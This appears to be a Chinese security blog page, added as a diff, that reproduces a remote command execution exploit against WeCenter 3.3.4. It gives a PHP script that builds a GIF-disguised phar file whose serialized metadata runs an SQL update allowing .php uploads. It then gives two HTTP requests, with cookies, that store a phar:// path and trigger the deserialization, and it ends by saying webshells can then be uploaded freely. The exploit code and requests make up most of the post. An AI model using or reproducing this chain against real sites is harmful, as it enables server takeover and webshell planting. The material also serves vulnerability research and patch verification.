@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="WeCenter 3.3.4 远程命令执行一、漏洞简介二、漏洞影响WeCenter 3.3.4 三、复现过程远程命令执行WeCenter 后台的 允许的附件文件类型处，设置了用户可上传的文件类型后缀。而这个配置是写在数据库中的，我们可以利用前面的任意SQL 语句执行的 POP 链，往字段中添加 php 文件后缀。  poc&lt;?php class AWS_MODEL &amp;#123;     pr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/WeCenter/WeCenter%203.3.4%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="WeCenter 3.3.4 远程命令执行一、漏洞简介二、漏洞影响WeCenter 3.3.4 三、复现过程远程命令执行WeCenter 后台的 允许的附件文件类型处，设置了用户可上传的文件类型后缀。而这个配置是写在数据库中的，我们可以利用前面的任意SQL 语句执行的 POP 链，往字段中添加 php 文件后缀。  poc&lt;?php class AWS_MODEL &amp;#123;     pr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId29.png">
+<meta property="article:published_time" content="2022-07-08T06:26:06.982Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-WeCenter/WeCenter 3.3.4 远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/WeCenter/WeCenter%203.3.4%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.982Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WeCenter-3-3-4-远程命令执行"><a href="#WeCenter-3-3-4-远程命令执行" class="headerlink" title="WeCenter 3.3.4 远程命令执行"></a>WeCenter 3.3.4 远程命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WeCenter 3.3.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p><strong>WeCenter</strong> 后台的 <strong>允许的附件文件类型</strong><br>处，设置了用户可上传的文件类型后缀。而这个配置是写在数据库中的，我们可以利用前面的任意<br><strong>SQL</strong> 语句执行的 <strong>POP</strong> 链，往字段中添加 <strong>php</strong> 文件后缀。</p>
+<p><img src="/resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png"></p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>&lt;?php
+class AWS_MODEL
+&#123;
+    private $_shutdown_query = array();
+
+    public function __construct($_shutdown_query)
+    &#123;
+        $this-&gt;_shutdown_query = $_shutdown_query;
+    &#125;
+&#125;
+
+$sql = array(&#39;update aws_system_setting set value=\&#39;s:45:&quot;jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php&quot;;\&#39; where varname=\&#39;allowed_upload_types\&#39;&#39;);
+$evilobj = new AWS_MODEL($sql);
+// phar.readonly无法通过该语句进行设置: init_set(&quot;phar.readonly&quot;,0);
+$filename = &#39;poc.phar&#39;;// 后缀必须为phar，否则程序无法运行
+file_exists($filename) ? unlink($filename) : null;
+$phar=new Phar($filename);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt;setMetadata($evilobj);
+$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>这里以 <strong>RCE</strong> 利用为例子。我们先用上面的 <strong>EXP</strong><br>生成文件，然后找个可以上传文件的地方。这里要注意，一定不要选择在用户头像处上传。这里我们通过发起问题的地方来上传文件。</p>
+<p><img src="/resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId28.png"></p>
+<p>通过如下数据包，将 <strong>headimgurl</strong> 插入数据库中（ <strong>Cookie</strong><br>前缀每个网站都不一样，修改成自己的即可）。</p>
+<pre><code>GET /wecenter334/?/m/weixin/binding/ HTTP/1.1
+Host: 0.0.0.0
+Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=akl7d5skae6ebea69bp8r1b4f0; CNZZDATA1273638993=564846603-1579067041-%7C1579097763; xhj__user_login=NcIFvaZbkaxoQfofEGo%2FSOCyrXq5R0lZofmF9uqaJHO5tpVyag7GEP3fdh9hKvPUf8Xj4x3kkxgLXcf1L4wocSQu9BUquhozfdiEN2Hfg8vj73XVn1f09yLfbpfbVs7K; xhj__WXConnect=&#123;&quot;access_token&quot;:&#123;&quot;openid&quot;:1&#125;,&quot;access_user&quot;:&#123;&quot;headimgurl&quot;:&quot;phar:\/\/uploads\/question\/20200116\/f39510a7e8e47e3e4dcabbadeedd12f7.gif&quot;,&quot;nickname&quot;:&quot;mochazz&quot;&#125;&#125;
+Connection: close
+$wx = array(
+    &#39;access_token&#39; =&gt; array(&#39;openid&#39;=&gt;1),
+    &#39;access_user&#39;  =&gt; array(&#39;headimgurl&#39;=&gt;&#39;phar:///uploads/question/20200116/f39510a7e8e47e3e4dcabbadeedd12f7.gif&#39;,&#39;nickname&#39;=&gt;&#39;mochazz&#39;)
+);
+echo json_encode($wx);
+</code></pre>
+<p>接着通过如下数据包触发 <strong>phar反序列化</strong> 执行 <strong>SQL</strong> 语句。</p>
+<pre><code>GET /wecenter334/?/account/ajax/synch_img/ HTTP/1.1
+Host: 0.0.0.0
+Cookie: XDEBUG_SESSION=PHPSTORM; Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1578564275,1578582675,1578897163; UM_distinctid=16fa7f15a43278-0cbd6002fe98e4-31730657-100200-16fa7f15a44385; xhj__Session=qb72k9k1sl53gqibbg53nf32o1; CNZZDATA1273638993=564846603-1579067041-%7C1579137884; xhj__user_login=N9hSYaQOjPMdtxOXo9jQuCVQSykmK88gl3DTI4AmL%2BnhLpgnHFGGSHkzxAPYaVMbXo%2FAndADc%2FaD0wytUEK71YrLmxWCuEZDCSwn9b0ApyOpcIKa6E4cOotHqZpZwVq%2B
+Connection: close
+</code></pre>
+<p>现在，我们就可以随意上传 <strong>webshell</strong> 了。</p>
+<p><img src="/resource/WeCenter3.3.4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId29.png"></p>
+<p>image</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/WeCenter/WeCenter%203.3.4%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qxtd00lby8v1bic5cp1s" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/WellCMS/WellCMS%201.1.02%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/WeCenter/WeCenter%203.3.4%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
